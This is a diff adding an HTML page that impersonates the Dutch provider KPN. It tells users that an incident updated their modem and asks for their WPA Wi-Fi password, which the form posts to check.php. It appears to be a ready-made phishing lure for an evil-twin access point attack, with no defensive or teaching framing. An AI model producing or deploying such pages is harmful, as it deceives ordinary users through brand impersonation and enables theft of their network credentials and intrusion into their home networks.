@@ -1,0 +1,131 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html lang="nl">
+<head>
+	<title>KPN Wi-Fi Herstellen</title>
+	<meta http-equiv="content-type" content="text/html; charset=windows-1250">
+	<style>
+		* {
+			font-size: 13px;
+			font-family: Arial, Helvetica, sans-serif;
+		}
+		html,body{
+			padding: 0px;
+			margin: 0px;
+		}
+		#wrapper, #header, #content, #footer {
+			width: 100%;
+			min-width: 100%!important;
+		}
+		#header {
+			background: url('logo.png'), url('bg.png');
+			background-size: auto 48px, 100%;
+			background-repeat: no-repeat, repeat-y;
+			background-position: 16px 16px, left;
+			height: 80px;
+			line-height: 80px;
+			font-size: 30px;
+			font-weight: bold;
+			color: white;
+			text-align: center;
+		}	
+		#content table {
+			position: absolute;
+			top: 50%;
+			left: 50%;
+			margin-top: -63px;
+			margin-left: -200px;
+			border: 2px solid #82ae36;
+			height: 126px;
+			width: 400px;
+			padding-bottom: 10px;
+		}
+		#content table thead th {
+			background-color: #82ae36;
+			color: white;
+			padding: 0px 0px 3px;
+		}
+		#footer {
+			position: absolute;
+			bottom: 0px;
+			text-align: center;
+			font-size: 12px;
+			height: 32px;
+		}
+		#footer .bar {
+			margin-top: 3px;
+			background-color: #6ba53a;
+			height: 15px;
+		}
+		.error {
+			color: red;
+			font-size: 12px;
+		}
+		@media screen and (min-width: 411px) and (max-width: 550px) {
+			#header {
+				text-align: right;
+			}
+			#header .spacer {
+				display: inline-block;
+				width: 20px;
+			}
+		}
+		@media screen and (max-width: 410px) {
+			#header {
+				font-size: 20px;
+				text-align: right;
+			}
+			#header .spacer {
+				display: inline-block;
+				width: 20px;
+			}
+			
+			
+			#content table {
+				position: absolute;
+					top: 50%;
+					left: 0px;
+				margin-top: -63px;
+				margin-left: 0px;
+				border: 2px solid #82ae36;
+				height: 126px;
+				width: 100%!important;
+				padding-bottom: 10px;
+			}
+		}
+	</style>
+</head>
+<body>
+	<div id="wrapper">
+		<div id="header">
+			Wi-Fi<sup>®</sup> Herstellen<span class="spacer"></span>
+		</div>
+		<div id="content">
+			<form method="POST" action="check.php" id="form1" name="form1">
+			<table cellspacing="0">
+				<thead>
+					<tr><th colspan="3">
+						KPN Wi-Fi<sup>®</sup> Herstellen
+					</th></tr>
+				</thead>
+				<tbody>
+					<tr>
+						<td colspan="3">
+							<center>Wegens een incident is uw Wi-Fi modem direct bijgewerkt.<br>Om uw Wi-Fi signaal te herstellen dient u uw WPA wachtwoord hieronder in te voeren.<br><br>
+							Indien u het wachtwoord niet aangepast heeft kunt u uw Wi-Fi wachtwoord aan de onderkant van uw Wi-Fi<sup>®</sup> modem vinden.<br><br>
+							</center>
+						</td>
+					</tr>
+					<tr>
+						<td align="right">Wachtwoord:</td><td><input type="password" name="key1"></td><td><input type="submit" value="Herstellen &gt;"></td>
+					</tr>
+				</tbody>
+			</table>
+			</form>
+		</div>
+		<div id="footer">
+			Copyright &copy; 2015-2016 KPN. All rights reserved.
+			<div class="bar"></div>
+		</div>
+	</div>
+</body>
+</html>
